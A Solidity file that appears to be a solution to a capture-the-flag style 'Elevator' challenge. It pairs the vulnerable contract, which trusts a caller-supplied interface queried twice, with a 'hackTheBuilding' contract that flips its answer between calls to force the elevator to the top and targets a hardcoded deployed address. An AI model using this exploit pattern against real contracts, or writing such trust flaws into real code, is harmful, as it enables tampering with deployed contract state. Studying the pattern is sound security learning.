pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// the below contract exploits the Elevator contract through use of the Building Interface 

contract hackTheBuilding {
  bool public flipped = false;

  Elevator public elly = Elevator(0xC81DbF62d3A932931043229035bd8c7D6eCd90E3);

  function isLastFloor(uint)  external returns (bool) {
    if(flipped){
      flipped = false;
      return true;
    }
    else{
      flipped = true;
      return false;
    }
  }

  function attemptHack() public {
    elly.goTo(10);
  }


}
